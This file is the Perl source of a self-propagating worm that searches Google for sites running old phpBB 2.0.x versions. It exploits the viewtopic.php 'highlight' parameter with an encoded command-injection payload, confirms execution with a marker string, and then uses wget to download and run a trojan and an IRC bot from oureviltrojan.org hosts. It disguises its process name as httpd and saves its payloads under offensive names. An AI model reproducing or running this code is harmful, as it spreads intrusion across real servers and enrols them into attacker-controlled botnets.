#
#	AN OUREVILTROJAN.ORG CREATION
#	    BASED AT LINUXDAY WORM
#

use strict;
use IO::Socket;
use IO::Handle;


my $process = '/usr/sbin/httpd'; 
$0="$process"."\0"x16;;
my $pid=fork;


sub fetch();
sub remote($);
sub http_query($);
sub encode($);

sub fetch(){
    my $rnd=(int(rand(9999)));
    my $n= 50;
    if ($rnd<5000) { $n<<=1;}
    my $s= (int(rand(10)) * $n);

    my @str=("%22by+phpBB+2.0.1%22+view+topic+.php+",
	     "%22by+phpBB+2.0.2%22+view+topic+.php+",
	     "%22by+phpBB+2.0.3%22+view+topic+.php+",
             "%22by+phpBB+2.0.4%22+view+topic+.php+",
	     "%22by+phpBB+2.0.5%22+view+topic+.php+",
	     "%22by+phpBB+2.0.6%22+view+topic+.php+",
	     "%22by+phpBB+2.0.7%22+view+topic+.php+",
	     "%22by+phpBB+2.0.8%22+view+topic+.php+",
	     "%22by+phpBB+2.0.9%22+view+topic+.php+",
	     "%22by+phpBB+2.0.10%22+view+topic+.php+" 
            );

    my $query="www.google.com.br/search?q=";
    $query.=$str[(rand(scalar(@str)))].$rnd;
    $query.="&num=$n&start=$s";

    my @lst=();
    my $page = http_query($query);
    while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"?>/g){
        if ($1 !~ m/google|cache|translate/){
            push (@lst,$1);
        }
    }
    return (@lst);
}

sub http_query($){
    my ($url) = @_;
    my $host=$url;
    my $query=$url;
    my $page="";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~s/$host//;
    if ($query eq "") {$query="/";};
    eval {
        local $SIG{ALRM} = sub { die "1";};
        alarm 10;
        my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
        print $sock "GET $query HTTP/1.0\nHost: $host\nAccept: */*\nUser-Agent: Mozilla/4.0\n\n ";
        my @r = <$sock>;
        $page="@r";
        alarm 0;
        close($sock);
    };    
    return $page;

}

sub encode($) {
    my $s = shift;
    $s =~ s/(.)/"chr(".ord($1).")%252E"/seg;
    $s =~ s/%252E$//;
    return $s;
}



eval {fork and exit;};

$|++;
open LOG,">> .holocausto"; # APENAS PARA DEBUGGING , EHEHEHEHEHE #
autoflush LOG 1;
srand;
my $iam=$ARGV[0];
my $oneday=time+86400; # Antigamente era 1 semana mais o google ficou pau no cu ...
my $page="";
my @urls;
my $url;






while(time<$oneday){
    @urls=fetch();
    foreach $url (@urls) {
	if ($url !~ /viewtopic.php/) {next;}
	$url =~ s/(.*\/viewtopic.php\?[t|p]=[0-9]+).*/$1/;
	print LOG "chk ".$url." ";
	my $cmd=encode("perl -e \"print q(jSVowMsd)\"");
	$url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
	$page = http_query($url);
	if ( $page =~ /jSVowMsd/ ){
	    $url =~ s/&highlight.*//;
	    my $upload=$url;
	    $upload =~ s/viewtopic.*//;
	    print LOG ">bug viewtopic encontrado ";
	    $cmd="wget http://trojan.oureviltrojan.org -O /tmp/.adolfhitler;perl /tmp/.adolfhitler";    # set cmd
	    $cmd=encode("$cmd");    # set cmd
	    $url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
	    $page = http_query($url);
	    
	    $cmd="wget http://ircbot.oureviltrojan.org  -O /tmp/.adolfhitler2; perl /tmp/.adolfhitler2; touch /tmp/.inibidor";    # set cmd
	    $cmd=encode("$cmd");    # set cmd
	    $url =~ s/&highlight.*//;
	    $url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
	    $page = http_query($url);
	    print LOG ">exploitado!\n";
	}
	else {
	    print LOG ">viewtopic ok\n";
	}
    }
}
close LOG;


